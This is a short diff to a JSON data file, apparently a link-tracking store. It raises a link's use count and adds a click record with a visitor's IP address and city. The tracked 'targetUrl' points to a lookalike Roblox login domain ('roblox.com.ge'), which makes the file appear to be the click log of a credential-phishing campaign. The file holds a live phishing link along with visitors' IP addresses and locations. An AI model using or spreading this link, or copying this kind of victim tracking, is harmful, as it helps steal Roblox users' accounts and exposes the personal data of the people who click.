@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1022,
+    "useCount": 1023,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8291,6 +8291,14 @@
       },
       {
         "timestamp": 1777227384092,
+        "ip": "185.104.167.238",
+        "country": "Colombia",
+        "city": "Chía",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
+      },
+      {
+        "timestamp": 1777227414989,
         "ip": "185.104.167.238",
         "country": "Colombia",
         "city": "Chía",
